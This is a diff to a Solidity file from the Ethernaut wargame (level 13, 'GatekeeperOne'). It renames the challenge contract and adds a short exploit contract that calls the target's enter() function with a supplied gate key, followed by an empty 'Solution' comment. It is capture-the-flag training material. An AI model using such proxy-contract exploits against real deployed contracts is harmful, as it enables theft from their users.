@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract GatekeeperOne {
+contract EthernautThirteenGatekeeperOne {
     address public entrant;
 
     modifier gateOne() {
@@ -37,3 +37,23 @@ contract GatekeeperOne {
         return true;
     }
 }
+
+contract EthernautThirteenGatekeeperOneExploit {
+    EthernautThirteenGatekeeperOne
+        private immutable ethernautThirteenGatekeeperOne;
+
+    constructor(EthernautThirteenGatekeeperOne _address) {
+        ethernautThirteenGatekeeperOne = EthernautThirteenGatekeeperOne(
+            _address
+        );
+    }
+
+    function exploit(bytes8 gateKey) external {
+        ethernautThirteenGatekeeperOne.enter(gateKey);
+    }
+}
+
+// https://ethernaut.openzeppelin.com/level/0x2a2497aE349bCA901Fea458370Bd7dDa594D1D69
+
+// Solution
+//
